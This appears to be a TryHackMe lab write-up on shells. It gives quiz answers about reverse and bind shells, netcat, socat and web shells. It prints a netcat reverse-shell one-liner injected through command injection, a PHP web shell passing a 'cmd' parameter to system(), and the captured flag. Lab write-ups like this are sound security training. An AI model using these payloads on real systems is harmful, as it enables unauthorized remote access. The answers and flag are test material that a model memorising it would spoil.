![image](https://github.com/user-attachments/assets/6c557937-247c-4c7f-906e-433d9424249e)# Shells Overview

### Shell Overview
- What is the command-line interface that allows users to interact with an operating system? `Shell`
- What process involves using a compromised system as a launching pad to attack other machines in the network? `Pivoting`
- What is a common activity attackers perform after obtaining shell access to escalate their privileges? `Privilege Escalation`

### Reverse Shell
- What type of shell allows an attacker to execute commands remotely after the target connects back? `Reverse Shell`
- What tool is commonly used to set up a listener for a reverse shell? `Netcat`

### Bind Shell
- What type of shell opens a specific port on the target for incoming connections from the attacker? `Bind Shell`
- Listening below which port number requires root access or privileged permissions? `1024`

### Shell Listeners
- Which flexible networking tool allows you to create a socket connection between two data sources? `socat`
- Which command-line utility provides readline-style editing and command history for programs that lack it, enhancing the interaction with a shell listener? `rlwrap`
- What is the improved version of Netcat distributed with the Nmap project that offers additional features like SSL support for listening to encrypted shells? `ncat`

### Shell Payloads

- Which Python module is commonly used for managing shell commands and establishing reverse shell connections in security assessments? `subprocess`
- What shell payload method in a common scripting language uses the exec, shell_exec, system, passthru, and popen functions to execute commands remotely through a TCP connection? `PHP`
- Which scripting language can use a reverse shell by exporting environment variables and creating a socket connection? `Python`


### Web Shell
- What vulnerability type allows attackers to upload a malicious script by failing to restrict file types? `Unrestricted File Upload`
- What is a malicious script uploaded to a vulnerable web application to gain unauthorized access? `Web Shell`

### Practical Task
- Using a reverse or bind shell, exploit the command injection vulnerability to get a shell. What is the content of the flag saved in the / directory?<br />
Open a netcat listener on the attackbox, then the payload is `; rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.14.90.188 4444 >/tmp/f`:<br />
![image](https://github.com/user-attachments/assets/ce3d3673-f44a-4b85-88c2-96cfc428076a)<br />


- Using a web shell, exploit the unrestricted file upload vulnerability and get a shell. What is the content of the flag saved in the / directory?<br />
Create a php file containing the following, and upload it:

      <?php
      if (isset($_GET['cmd'])) {
          system($_GET['cmd']);
      }
      ?>

Then run `http://10.10.135.35:8082/uploads/webshell.php?cmd=cat%20%2Fflag.txt`:<br />
![image](https://github.com/user-attachments/assets/16ee7be4-25f4-4b2d-af8f-cf89681f3479)<br />
`THM{202bb14ed12120b31300cfbbbdd35998786b44e5}`
